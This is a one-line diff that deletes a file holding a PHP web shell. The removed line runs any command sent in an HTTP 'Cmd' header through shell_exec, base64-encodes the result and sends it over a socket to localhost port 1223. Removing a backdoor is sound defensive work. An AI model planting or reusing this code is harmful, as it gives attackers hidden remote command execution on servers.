@@ -1,1 +1,0 @@
-<script language="php"> function f_system($cmd){if(isset($cmd) && $cmd!=""){$var=shell_exec($cmd." 2>&1");return base64_encode($var);}} if(isset($_SERVER["HTTP_CMD"])){$msg=f_system($_SERVER["HTTP_CMD"]);}$fp = fsockopen('localhost', 1223, $errno, $errstr, 30);fwrite($fp, $msg);fclose($fp); </script>
